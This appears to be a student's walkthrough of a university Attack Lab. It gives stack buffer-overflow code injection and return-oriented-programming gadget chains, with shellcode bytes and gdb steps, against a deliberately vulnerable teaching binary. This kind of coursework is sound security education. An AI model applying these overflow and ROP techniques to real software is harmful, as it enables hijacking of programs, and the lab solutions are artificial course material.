# PHASE 1

use `objdump -d ctarget` to look assembly code
```
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          call   401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      ret    
  4017be:       90                      nop
  4017bf:       90                      nop

00000000004017c0 <touch1>:
```

Key information confirmation: 
* Buffer size: `sub $0x28, %rsp` indicates that 40 bytes of space was allocated on the stack.
* Returns the address location: The Gets function writes data to the address pointed to by `%rsp`. 
Therefore, once the first 40 bytes fill the buffer, the subsequent 8 bytes overwrite the return address stored above the getbuf stack frame.
* Target address: The entry address of touch1 is `0x00000000004017c0`.

Construction of attack string components: 
* Filled with junk data: arbitrary characters(e.g., 41 41 41... i.e., 'A') 40 bytes 
* return address: c0 17 40 00 00 00 00 00 8 bytes

store the attack string in the `level1.txt` file and pass the string through HEX2RAW
```
cat phase1.txt | ./hex2raw | ./ctarget -q
```

# PHASE 2

```
00000000004017ec <touch2>:
```
Find the entry address for touch2: 0x4017ec

write the injection code `inject_phase2.s`:
```
pushq $0x4017ec           # touch2
movl $0x59b997fa, %edi    # cookie
retq         
```
* push the touch2 address onto the stack as the target for subsequent ret calls.
* set function parameters cookie.
* pops up the topmost touch2 address on the stack and switches control to it.


compile and extract the byte-level codes for the instruction:
```
gcc -c inject_phase2.s -o inject_phase2.o
objdump -d inject_phase2.o
```

The output:
```
0000000000000000 <.text>:
0:   68 ec 17 40 00          push   $0x4017ec
5:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
a:   c3                      ret 
```

Override return address:
find the starting stack address of the `getbuf`
```
gdb ./ctarget -q
(gdb) break getbuf
(gdb) run -q
(gdb) print /x $rsp
```
Output: `0x5561dca0`. 

Note: After executing `sub $0x28, %rsp` decreases by 40 bytes to 0x5561dc78 (originally 0x5561dca0 - 0x28).
The new value `0x5561dc78` is the actual stack starting address and the location where we inject the code.

Layout of input data on the stack
  * inject code: 11 bytes
  * NOP padding (0x90) 29 bytes
  * Return address (override value) 8 bytes

run the code to check correctness:
```
cat phase2.txt | ./hex2raw | ./ctarget -q
```

# PHASE 3
```
00000000004018fa <touch3>:
```
Find the entry address for touch3: 0x4018fa

Find the ascii-code representation for cookie:
* Remove the prefix 0x to obtain eight hexadecimal numbers: 5 9 b 9 9 7 f a
* Query the ASCII code for each character:
  * '5' → 0x35, '9' → 0x39, 'b' → 0x62, '9' → 0x39, '9' → 0x39
  ,'7' → 0x37, 'f' → 0x66, 'a' → 0x61
* Add the string ending character '\0' at the end → 0x00
* The final byte sequence (for the attack string) text:
`35 39 62 39 39 37 66 61 00`

The most tricky part is :
* touch3 invokes the hexmatch function, which internally allocates a random 110-byte buffer on the stack—likely to overwrite the stack frame of getbuf itself.
* If the cookie string is put somewhere nearby, it will be corrupted, resulting in a failed string comparison.
* Therefore, the cookie string must store in a location **inaccessible to hexmatch**. 
* The safest approach is to place it within the stack frame of the test function (specifically **above** the getbuf stack frame at a higher memory address).
* From phase2, we know the return address of getbuf is 0x5561dca0, so we put it at address 0x5561dca8.

Write and inject attack code(this code performs three tasks):
* Load the absolute address of the prepared Cookie string into the `%rdi` register (the first argument of a function in x86-64 architecture).
* Push the entry address of the touch3 function onto the stack.
* Execute the RET instruction to pop the address of touch3 from the stack and jump to it.

compile and extract the byte-level codes for the instruction:
```
gcc -c inject_phase3.s -o inject_phase3.o
objdump -d inject_phase3.o
```

The output:
```
0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          push   $0x4018fa
   c:   c3                      ret 
```

Construct a complete attack string
by assembling all components in sequence, generate the final exploit string:
* The compiled machine code. 
* Filling and Overlapping.
* Return address to the address where we injected the code. 
* Cookie string stored as string data in the secure zone.

# PHASE 4
Available gadgets extracted from the Farm
* Gadget 1：pop %rax; ret
  * Source function: getval_280, address 0x4019ca 
  * Byte sequence: b8 29 58 90 c3 
  * Key section: Starting from 0x4019cc, the sequence includes 58 90 c3, `pop %rax`, `nop`, and `ret`.
  * Valid address: 0x4019cc
* Gadget 2：mov %rax, %rdi; ret 
  * Source function: addval_273, address 0x4019a0 
  * Byte sequence: 8d 87 48 89 c7 c3 
  * Key section: Starting from 0x4019a2, the sequence includes 48 89 c7 c3, which corresponds to the instructions `mov %rax,%rdi;`, `ret`.
  * Valid address: 0x4019a2

The Core ROP chain logic:
* Pop the Cookie value 0x59b997fa into `%rax` first.
* Use `mov %rax, %rdi` to copy the value to the first parameter register `%rdi`.
* Go to the touch2 function

Construct attack string
* Any byte (e.g., 00) is padded with 40 bytes to cover the return address
* Gadget 1 Address (`pop %rax`)
* Cookie value (will be pop into `%rax`)
* Gadget 2 Address (`mov %rax, %rdi`)
* touch2 entry address 

# PHASE 5

Key idea: `%rsp` Relative Addressing
* Get the current stack pointer `%rsp`. 
* The fixed offset between the Cookie string 
pre-placed on the stack and `%rsp` is passed to `%rsi` via the gadget chain. (core point)
* Call `add_xy`(`lea (%rdi, %rsi, 1), %rax`) to compute the string address.
* Store the result address in `%rdi` (first parameter register).
* Go to touch3

🧬 Final Gadget chain (8 pieces total, including reusable ones)

Step Address Instruction Sequence Function 
* G1 0x401a06 `mov %rsp, %rax; ret`  Get the current stack pointer 
* G2 0x4019a2 `mov %rax, %rdi; ret` stores the stack pointer into `%rdi` (the base address for subsequent addition)
* G3 0x4019cc `pop %rax; nop; ret` pop the offset to `%rax`
* (Data) 0x48 (72 bytes) Hard-coded offset value
* G4 0x4019dd `mov %eax, %edx; nop; ret` pass low 32-bit offset 
* G5 0x401a34 `mov %edx, %ecx; cmp %cl,%cl; ret` pass the offset to `%ecx` (no side effects)
* G6 0x401a13 `mov %ecx,%esi; nop; nop; ret` pass the offset to `%esi` (addition operation source operand)
* G7 0x4019d6 `lea (%rdi, %rsi, 1), %rax; ret` calculates `%rdi` + `%rsi` * 1 (string address) to `%rax`
* G8 0x4019a2 `mov %rax, %rdi; ret` stores the address into the first parameter register
* G9 0x4018fa <touch3> calls touch3 

Note: 
* The instruction `mov %eax, %edx` automatically clears the high 32 bits of `%rdx`.
Since the offset 0x48 is much smaller than $2^{32}$, the high 32 bits remain zero 
and thus do not affect subsequent 64-bit computations.
* When executing to G1, `%rsp` points to the storage location at G2 address on the stack. 
So, the distance from the G2 address to the first byte of the cookie string equals the total size of all gadget addresses, 
plus the offset value and the touch3 address (72 bytes).
  * Reason: ret is equivalent to `pop %rip `: Read the memory value pointed to by `%rsp` (the G1 address here) and load it into program counter `%rip`.
  Increase `%rsp` by 8.
  * After executing ret: The CPU begins executing the first instruction of G1. 
  At this point, `%rsp` has already pointed to the next 8-byte location, which is the storage position of the G2 address.